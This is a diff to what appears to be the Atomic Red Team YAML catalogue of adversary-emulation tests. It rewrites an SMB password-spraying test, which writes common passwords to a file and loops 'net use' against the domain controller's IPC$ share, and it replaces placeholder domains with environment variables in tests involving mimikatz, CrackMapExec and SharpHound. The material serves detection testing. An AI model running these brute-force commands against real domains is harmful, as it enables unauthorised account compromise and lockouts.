@@ -5008,45 +5008,28 @@ credential-access:
       - Containers
       identifier: T1110.001
     atomic_tests:
-    - name: Brute Force Credentials of all Active Directory domain users via SMB
+    - name: Brute Force Credentials of single Active Directory domain users via SMB
       auto_generated_guid: '09480053-2f98-4854-be6e-71ae5f672224'
-      description: 'Creates username and password files then attempts to brute force
-        Active Directory accounts on remote host
+      description: 'Attempts to brute force a single Active Directory account by testing
+        connectivity to the IPC$ share on a domain controller
 
 '
       supported_platforms:
       - windows
       input_arguments:
-        input_file_users:
-          description: Path to a file containing a list of users that we will attempt
-            to brute force
-          type: Path
-          default: DomainUsers.txt
-        input_file_passwords:
-          description: Path to a file containing a list of passwords we will attempt
-            to brute force with
-          type: Path
-          default: passwords.txt
-        remote_host:
-          description: Hostname of the target system we will brute force upon
+        user:
+          description: Account to bruteforce
           type: String
-          default: "\\\\COMPANYDC1\\IPC$"
-        domain:
-          description: Active Directory domain name of the target system we will brute
-            force upon
-          type: String
-          default: YOUR_COMPANY
+          default: "%username%"
       executor:
         name: command_prompt
         command: |
-          net user /domain > #{input_file_users}
-          echo "Password1" >> #{input_file_passwords}
-          echo "1q2w3e4r" >> #{input_file_passwords}
-          echo "Password!" >> #{input_file_passwords}
-          @FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL
-        cleanup_command: |-
-          del #{input_file_users} >nul 2>&1
-          del #{input_file_passwords} >nul 2>&1
+          echo Password1> passwords.txt
+          echo 1q2w3e4r>> passwords.txt
+          echo Password!>> passwords.txt
+          echo Spring2022>> passwords.txt
+          echo ChangeMe!>> passwords.txt
+          @FOR /F "delims=" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:"%userdomain%\#{user}" "%p" 1>NUL 2>&1 && @echo [*] #{user}:%p && @net use /delete %logonserver%\IPC$ > NUL
     - name: Brute Force Credentials of single Active Directory domain user via LDAP
         against domain controller (NTLM or Kerberos)
       auto_generated_guid: c2969434-672b-4ec8-8df0-bbb91f40e250
@@ -5060,7 +5043,7 @@ credential-access:
         user:
           description: Account to bruteforce
           type: String
-          default: bruce.wayne
+          default: "$ENV:USERNAME"
         passwords_path:
           description: List of passwords we will attempt to brute force with
           type: Path
@@ -5068,7 +5051,7 @@ credential-access:
         domain:
           description: Active Directory domain FQDN
           type: String
-          default: contoso.com
+          default: "$env:UserDnsDomain"
         auth:
           description: authentication method to choose between "NTLM" and "Kerberos"
           type: String
@@ -5339,7 +5322,7 @@ credential-access:
         domain:
           description: Domain to brute force against
           type: String
-          default: "(Get-ADDomain | Select-Object -ExpandProperty Name)"
+          default: "$Env:USERDOMAIN"
       executor:
         name: powershell
         elevation_required: false
@@ -32711,7 +32694,7 @@ defense-evasion:
         domain:
           description: domain
           type: String
-          default: atomic.local
+          default: "%userdnsdomain%"
         mimikatz_path:
           description: mimikatz windows executable
           type: Path
@@ -32765,7 +32748,7 @@ defense-evasion:
         domain:
           description: domain
           type: String
-          default: atomic.local
+          default: "%userdnsdomain%"
       dependency_executor_name: powershell
       dependencies:
       - description: 'CrackMapExec executor must exist on disk at specified location
@@ -53563,7 +53546,7 @@ discovery:
         domain:
           description: Domain FQDN
           type: String
-          default: contoso.com
+          default: "$env:UserDnsDomain"
         uac_prop:
           description: UAC Property to search
           type: String
@@ -54566,7 +54549,7 @@ discovery:
         domain:
           description: FQDN of the targeted domain
           type: string
-          default: DOMAIN.CORP
+          default: "$env:UserDnsDomain"
         sharphound_path:
           description: SharpHound Windows executable
           type: path
@@ -55695,7 +55678,7 @@ discovery:
         target_domain:
           description: Domain to query for domain controllers
           type: String
-          default: domain.local
+          default: "%userdnsdomain%"
       executor:
         command: 'nltest.exe /dclist:#{target_domain}
 
@@ -65928,7 +65911,7 @@ lateral-movement:
         domain:
           description: domain
           type: String
-          default: atomic.local
+          default: "%userdnsdomain%"
         mimikatz_path:
           description: mimikatz windows executable
           type: Path
@@ -65982,7 +65965,7 @@ lateral-movement:
         domain:
           description: domain
           type: String
-          default: atomic.local
+          default: "%userdnsdomain%"
       dependency_executor_name: powershell
       dependencies:
       - description: 'CrackMapExec executor must exist on disk at specified location
